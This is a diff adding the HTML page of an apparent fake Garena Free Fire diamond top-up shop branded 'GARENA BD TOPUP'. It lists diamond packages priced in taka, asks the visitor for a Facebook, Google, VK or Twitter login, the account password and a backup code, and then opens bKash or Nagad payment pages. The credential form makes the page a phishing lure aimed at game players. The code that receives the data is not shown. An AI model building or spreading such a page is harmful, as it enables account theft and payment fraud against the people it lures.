@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+  <title>Airdrop FF</title>
+  <style>
+    *{
+    padding: 0;
+    margin: 0;
+    font-family: roboto;
+  }
+  .one{
+    background-color: rgb(225, 68, 24);
+    height: 120px;
+    width: 120px;
+    display: flex;
+    justify-content: center;
+    align-content: center;
+    border-radius: 50%;
+    margin-top: 15px;
+    margin-left: 15px;
+    margin-bottom: 15px;
+  }
+  .one p{
+    margin-top: 10px;
+    color: whitesmoke;
+    font-size: 6.5rem;
+  }
+  .slre{
+    display: flex;
+    border: 1px solid gray;
+    margin-top: 20px;
+    margin-left: 10px;
+    margin-right: 10px;
+  }
+  .slmet p{
+    margin-top: 40px;
+    font-size: 4rem;
+    margin-left: 10px;
+  }
+  .amountli{
+    border: 1px solid gray;
+    margin-left: 10px;
+    margin-right: 10px;
+    text-align: center;
+    justify-content: center;
+  }
+  .amount input{
+    /margin-left:50;/
+    border: 1px solid gray;
+    padding: 10px;
+  }
+  .amountp{
+    height: 100px;
+    width: 50%;
+    border: 2px solid rgb(45, 9, 174);
+    margin: 5px 5px 5px 5px;
+    display: flex;
+    margin-bottom: 15px;
+    border-radius: 10px;
+  }
+  .amount{
+    display: flex;
+  }
+  .price{
+    display: flex;
+  }
+  .firp{
+    margin-left: 25px;
+    font-size: 2.5rem;
+  }
+  .secp{
+    margin-left: 30px;
+    margin-right: 15px;
+    margin-top: 11px;
+    color: rgb(225, 68, 24);
+    font-size: 2rem;
+    font-weight: bold;
+  }
+  #in{
+    height: 100px;
+    width: 750px;
+    margin-bottom: 5px;
+    border: 3px solid rgb(45, 9, 174);
+    text-align: center;
+    border-radius: 5px;
+  }
+  hr{
+    size: 2px;
+    border: 1px solid green;
+    margin-bottom: 5px;
+  }
+  .pay{
+    background-color: red;
+    margin-top: 20px;
+    margin-left: 15px;
+    margin-right: 15px;
+    text-align: center;
+    border-radius: 10px;
+    color: white;
+  }
+  #tran{
+    padding-top: 30px;
+    padding-bottom: 20px;
+    font-size: 3rem;
+  }
+  #nagad{
+    width: 300px;
+    height: auto;
+  }
+  #re2{
+    height: 100px;
+    width: 650px;
+    border-radius: 10px;
+    border: 1px solid blue;
+    text-align: center;
+    margin-bottom: 15px;
+  }
+  .list{
+    text-align: start;
+    margin-left: 60px;
+  }
+  li{
+    margin-bottom: 10px;
+    
+  }
+  #lasli{
+    padding-bottom: 20px;
+  }
+  .bt{
+    text-align: center;
+  }
+  #vy{
+    height: 100px;
+    width: 550px;
+    justify-content: center;
+    color: white;
+    background-color: rgb(225, 68, 24);
+    border-radius: 10px;
+    border: 1px solid palegreen;
+    margin-bottom: 50px;
+    font-size: 3rem;
+    margin-top: 25px;
+  }
+  .amountp {
+    background-color: white; /* Set the initial background color */
+    transition: background-color 1s; /* Add a transition for the background-color property */
+  }
+  
+  .amountp:hover {
+    background-color: aqua; /* Change the background color when hovering */
+    animation: revertColor 0.5s ease 1 forwards; /* Apply an animation to revert the color after 1 second and keep it */
+    border: 4px solid green;
+    height: 98px;
+    width: 49%;
+  }
+  
+  @keyframes revertColor {
+    0% {
+      background-color: aqua; /* Start with the hover color */
+    }
+    100% {
+      background-color: white; /* End with the initial color */
+    }
+  }
+  input[type="radio"] {
+    width: 70px;
+    height: 70px;
+    margin-top: 15px;
+    margin-left: 10px;
+    border: 2px solid rgb(9, 241, 79);
+    color: green;
+  }
+  input::placeholder {
+    font-size: 2rem;
+    color: #999;
+    text-align: center;
+  }
+  input{
+    font-size: 3rem;
+    border: 3px solid green;
+    height: 80px;
+    border-radius: 20px;
+    text-align: center;
+  }
+  /* Add some basic styling to the footer */
+  footer {
+      background-color: #333;
+      color: #fff;
+      padding: 20px 0;
+  }
+  
+  .footer-content {
+      display: flex;
+      justify-content: space-between;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+  }
+  .footer-info, .footer-social {
+      flex: 1;
+      padding: 0 20px;
+  }
+  
+  h4 {
+      font-size: 40px;
+      margin-bottom: 10px;
+  }
+  
+  p {
+      font-size: 30px;
+  }
+  
+  .social-icon {
+      display: block;
+      margin-top: 5px;
+      text-decoration: none;
+      color: #fff;
+    font-size: 30px;
+  }
+  
+  /* Style the bottom copyright text */
+  .footer-bottom {
+      text-align: center;
+      background-color: #222;
+      padding: 10px 0;
+    font-size: 2rem
+  }
+  
+  /* Adjust link styles for better visibility in Chrome */
+  a {
+      color: #fff;
+      text-decoration: none;
+  }
+  
+  a:hover {
+      text-decoration: underline;
+  }
+  .cng{
+    background-color: white;
+    color: black;
+  }
+  #dlogo{
+    width: 980px;
+    height: 450px;
+  }
+  #bkash{
+    width: 300px;
+    height: auto;
+  }
+  #method{
+    font-size: 3rem;
+  }
+  #n{
+    margin-bottom: 100px;
+  }
+  #b{
+    margin-bottom: 20px;
+    
+  }
+  .log2{
+    display: flex;
+  }
+  #continue{
+    height: 100px;
+    width: 550px;
+    justify-content: center;
+    color: white;
+    background-color: rgb(225, 68, 24);
+    border-radius: 10px;
+    border: 1px solid rgb(225, 68, 24);
+    margin-bottom: 150px;
+    font-size: 3rem;
+    margin-top: 25px;
+  }
+  .alt p{
+    font-size: 3rem;
+    color: white;
+    padding: 25px;
+  }
+  #vy:hover{
+    height: 90px;
+    width: 540px;
+    border: 3px solid blue;
+  }
+  .tid{
+    text-align: center;
+    margin-top: 25px;
+  }
+  .tid p{
+    color: deeppink;
+    font-size: 3.2rem;
+    font-weight: bold;
+  }
+  .border{
+    border: 3px solid rgb(45, 9, 174);
+    margin-right: 20px;
+  }
+  .border:hover{
+    border: 3px solid rgb(11, 216, 38);
+  }
+  .logo2{
+    display: flex;
+    margin-bottom: 40px;
+  }
+  select{
+    height: 100px;
+    width: 400px;
+    font-size: 3rem;
+    font-weight: bolder;
+    color: rgb(45, 9, 174);
+    border: 3px solid palegreen;
+    text-align: center;
+    margin-top: 30px;
+  }
+  #bacc{
+    margin-bottom: 50px;
+  }
+ .ntf{
+   height: 400px;
+   width: 900px;
+   background-color: black;
+   border-radius: 40px;
+   
+ }
+ .alt {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8); /* optional: semi-transparent background */
+            padding: 0px;
+            border-radius: 50px;
+            color: white;
+            text-align: center;
+            display: none;
+        }
+
+        .ntf {
+            /* Add any additional styling for the notification div */
+        }
+
+        /* Style for the OK button */
+        .ok-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            height: 100px;
+            width: 300px;
+            font-size: 3rem;
+        }
+  #topig{
+    margin-left: 370px;
+    height: 210px;
+  }
+  </style>
+  <link rel="stylesheet" href="main.css">
+</head>
+<body>
+  <header>
+    <div class="logo">
+        <a href="https://garenabdtop.github.io/GarenaBD/"><img id="glogo"
+                src="https://banner2.cleanpng.com/20180327/uhw/kisspng-fifa-online-3-blackshot-garena-icon100-computer-i-steam-5aba1e32e3d3c6.7769673715221468669332.jpg"
+                alt="Gshop Logo"></a>
+        <p id="logp">Airdrop</p>
+      <img id="topig" src="https://admin.gosizi.com/products/1709666292.png" alt="mainlogo">
+    </div>
+    <hr color="black">
+</header>
+      <div class="slre">
+        <div class="one">
+          <p>1</p>
+        </div>
+        <div class="slmet">
+          <p>Recharge Amount</p>
+        </div>
+      </div>
+    <div class="amountli">
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount1" value="Option 1"> <label for="amount1"><div class="price"><p class="firp">115<br>Diamond</p>
+          <p class="secp">৳69</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount2" value="Option 2"> <label for="amount2"><div class="price"><p class="firp">240<br>Diamond</p>
+          <p class="secp">৳135</p></div>
+        </label></div>
+    </div>
+    <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount3" value="Option 3"> <label for="amount3"><div class="price"><p class="firp">355<br>Diamond</p>
+          <p class="secp">৳210</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount4" value="Option 4"> <label for="amount4"><div class="price"><p class="firp">505<br>Diamond</p>
+          <p class="secp">৳315</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount5" value="Option 5"> <label for="amount5"><div class="price"><p class="firp">610<br>Diamond</p>
+          <p class="secp">৳360</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount6" value="Option 6"> <label for="amount6"><div class="price"><p class="firp">850<br>Diamond</p>
+          <p class="secp">৳510</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount7" value="Option 7"> <label for="amount7"><div class="price"><p class="firp">1090<br>Diamond</p>
+          <p class="secp">৳655</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount8" value="Option 8"> <label for="amount8"><div class="price"><p class="firp">1240<br>Diamond</p>
+          <p class="secp">৳730</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount9" value="Option 9"> <label for="amount9"><div class="price"><p class="firp">1720<br>Diamond</p>
+          <p class="secp">৳1020</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount10" value="Option 10"> <label for="amount10"><div class="price"><p class="firp">2090<br>Diamond</p>
+          <p class="secp">৳1240</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount11" value="Option 11"> <label for="amount11"><div class="price"><p class="firp">2530<br>Diamond</p>
+          <p class="secp">৳1450</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount12" value="Option 12"> <label for="amount12"><div class="price"><p class="firp">5060<br>Diamond</p>
+          <p class="secp">৳2920</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount13" value="Option 13"> <label for="amount13"><div class="price"><p class="firp">10120<br>Diamond</p>
+          <p class="secp">৳5880</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount14" value="Option 14"> <label for="amount14"><div class="price"><p class="firp">LevelUp<br>Pass</p>
+          <p class="secp">৳135</p></div>
+        </label></div>
+    </div>
+      <div class="amount">
+        <div class="amountp"><input type="radio" name="amount" id="amount15" value="Option 15"> <label for="amount15"><div class="price"><p class="firp">Weekly<br></p>
+          <p class="secp">৳132</p></div>
+        </label></div>
+        <div class="amountp"><input type="radio" name="amount" id="amount16" value="Option 16"> <label for="amount16"><div class="price"><p class="firp">Monthly<br></p>
+          <p class="secp">৳660</p></div>
+        </label></div>
+    </div>
+    </div>
+    <div class="cng">
+      <div class="slre">
+        <div class="one">
+          <p>2</p>
+        </div>
+        <div class="slmet">
+          <p>Select Account Type</p>
+          <hr>
+          <select>
+            <option>Facebook</option>
+            <option>Google</option>
+            <option>VK</option>
+            <option>Tweeter</option>
+          </select>
+          <br>
+          <p id="gmn">Account:</p>
+          <input id="acnid" type="text" placeholder="Gmail Or Number">
+          <p>Account Password:</p>
+            <input id="acnpass" type="Password" placeholder="Account Password">
+          <p>Backup Code:</p>
+            <input id="bacc" type="text" placeholder="Backup Code">
+        </div>
+      </div>
+      <div class="tracod">
+        <div class="slre">
+        <div class="one">
+          <p>3</p>
+        </div>
+        <div class="slmet">
+          <p>Instant Payment</p><br>
+          <div class="logo2">
+            <div class="border"><label><input type="radio" name="payment" id="b" value="bk"><img id="bkash" src="https://www.logo.wine/a/logo/BKash/BKash-bKash-Logo.wine.svg" alt="bKash Logo" width="300px" height="auto">
+            </label></div>
+            <div class="border"><label><input type="radio" name="payment" id="n" value="ng"><img id="nagad" src="https://www.himublog.com/wp-content/uploads/2021/06/nagad.jpg" alt="Nagad Image" class="large-image">
+            </label></div>
+          </div>
+        </div>
+      </div>
+        <div class="alt">
+        <div class="ntf">
+            <p>Alert: <br><br>Please fill all options</p>
+            <button class="ok-button" onclick="closeNotification()">OK</button>
+        </div>
+          </div>
+          <div class="bt">
+            <button id="continue">NEXT</button>
+          </div>
+        <footer>
+    <div class="contact-info">
+        <a href="https://wa.me/+8801891707400" target="_blank" class="whatsapp-btn">
+            <i class="fab fa-whatsapp"></i>
+          <p>WhatsApp</p>
+        </a>
+        <div class="gmail-section">
+            <i class="far fa-envelope"></i>
+        </div>
+    </div>
+    <div class="opening-times">
+        Opening Times: 24/7
+    </div>
+    <div class="section-option">
+        <a>garenabdtopup99@gmail.com</a>
+    </div>
+    <div class="copyright">
+        &copy; 2024 GARENA BD TOPUP. All rights reserved.
+    </div>
+</footer>
+<script>
+  document.getElementById('continue').addEventListener('click', function(event) {
+      event.preventDefault();
+
+      // Check if an amount option is selected in the 'amount' section
+      var amountInputs = document.querySelectorAll('input[name="amount"]');
+      var amountSelected = false;
+      for (var i = 0; i < amountInputs.length; i++) {
+          if (amountInputs[i].checked) {
+              amountSelected = true;
+              break;
+          }
+      }
+
+      // Check if a payment method is selected in the 'logo2' section
+      var paymentInputs = document.querySelectorAll('input[name="payment"]');
+      var paymentSelected = false;
+      for (var i = 0; i < paymentInputs.length; i++) {
+          if (paymentInputs[i].checked) {
+              paymentSelected = true;
+              break;
+          }
+      }
+
+      // Check if all input fields are filled
+      var playerIdInput = document.getElementById('acnid');
+      var accountInput = document.getElementById('acnpass');
+      var passwordInput = document.getElementById('bacc');
+
+      if (!amountSelected || !paymentSelected || playerIdInput.value.trim() === '' || accountInput.value.trim() === '' || passwordInput.value.trim() === '') {
+          document.querySelector('.alt').style.display = 'block';
+          return;
+      }
+
+      // Proceed to the next step if all conditions are met
+      var selectedPaymentValue = null;
+      for (var i = 0; i < paymentInputs.length; i++) {
+          if (paymentInputs[i].checked) {
+              selectedPaymentValue = paymentInputs[i].value;
+              break;
+          }
+      }
+      if (selectedPaymentValue === 'bk') {
+          window.open('Bkash-pay.html', '_blank');
+      } else if (selectedPaymentValue === 'ng') {
+          window.open('Nagad-pay.html', '_blank');
+      } else {
+          alert('Invalid payment selection');
+      }
+  });
+
+  function closeNotification() {
+      // Hide the notification by setting its display property to none
+      document.querySelector('.alt').style.display = 'none';
+  }
+</script>
+ 
+</body>
+</html>
